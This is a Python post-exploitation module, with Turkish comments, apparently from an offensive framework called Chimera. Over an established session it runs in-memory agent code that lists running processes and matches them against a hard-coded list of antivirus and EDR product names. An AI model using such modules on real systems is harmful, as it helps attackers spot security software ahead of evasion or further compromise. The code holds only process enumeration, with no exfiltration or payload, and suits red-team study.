# =============================================================================
# Chimera Post: Process / AV Check
# =============================================================================
# Çalışan süreçlerde bilinen AV/EDR isimlerini arar (stdlib).
#
# KULLANIM:
#   use post/chimera/process_av_check
#   set SESSION 1
#   run
# =============================================================================

from typing import Any

from core.module import BaseModule
from core.option import Option
from core.session_bridge import run_chimera_post_module

AGENT_CODE = r'''
"""Chimera in-memory: process list AV/EDR name check."""
import subprocess
import sys
import time

AV_NAMES = [
    "avp", "avgui", "avast", "bdagent", "bdss", "mcshield", "mfemms",
    "msmpeng", "securityhealthservice", "savservice", "ccsvchst",
    "rtvscan", "egui", "ekrn", "fsav", "fshoster", "norton",
    "sophos", "savadmin", "csfalconservice", "crowdstrike", "falcon",
    "sentinelagent", "sentinelone", "cbdefense", "carbonblack",
    "cylancesvc", "cylanceui", "xagt", "traps", "cyvera",
    "elastic-endpoint", "elastic-agent", "osqueryd", "wazuh",
    "clamd", "clamav", "freshclam", "eset", "kaspersky",
    "windefend", "defender", "smartscreen",
]


def _process_names():
    names = []
    try:
        if sys.platform == "win32":
            raw = subprocess.run(
                "tasklist /FO CSV /NH",
                shell=True,
                capture_output=True,
                text=True,
                timeout=15,
            ).stdout or ""
            for line in raw.splitlines():
                parts = line.strip('"').split('","')
                if parts:
                    names.append(parts[0].lower())
        else:
            raw = subprocess.run(
                "ps -A -o comm= 2>/dev/null || ps -ax -o comm=",
                shell=True,
                capture_output=True,
                text=True,
                timeout=15,
            ).stdout or ""
            for line in raw.splitlines():
                base = line.strip().split("/")[-1].lower()
                if base:
                    names.append(base)
    except Exception:
        pass
    return names


def run():
    lines = [
        "=== CHIMERA process_av_check ===",
        "Tarih: %s" % time.strftime("%Y-%m-%d %H:%M:%S"),
        "Platform: %s" % sys.platform,
        "",
    ]
    procs = _process_names()
    hits = []
    for proc in procs:
        for av in AV_NAMES:
            if av in proc:
                hits.append(proc)
                break
    # unique preserve order
    seen = set()
    uniq = []
    for h in hits:
        if h not in seen:
            seen.add(h)
            uniq.append(h)

    lines.append("Toplam surec adi: %s" % len(procs))
    if uniq:
        lines.append("AV/EDR adayi surecler:")
        for h in uniq:
            lines.append("  * %s" % h)
        lines.append("")
        lines.append("[!] %s eslesme" % len(uniq))
    else:
        lines.append("[+] Bilinen AV/EDR sureci eslesmedi (yanlis negatif olabilir).")
    return "\n".join(lines)
'''


class process_av_check(BaseModule):
    """Chimera oturumunda süreç tabanlı AV/EDR kontrolü."""

    Name = "Chimera Process AV Check"
    Description = "Chimera session: süreç listesinde bilinen AV/EDR isimlerini arar"
    Author = "Mahmut P."
    Category = "post/chimera"
    Version = "1.0"

    def __init__(self) -> None:
        self.Options = {
            "SESSION": Option(
                name="SESSION",
                value="",
                required=True,
                description="Chimera session ID",
            ),
        }
        super().__init__()

    def run(self, options: dict[str, Any]) -> bool:
        return run_chimera_post_module(
            options=options,
            module_name="process_av_check",
            agent_source=AGENT_CODE,
            func_name="run",
        )
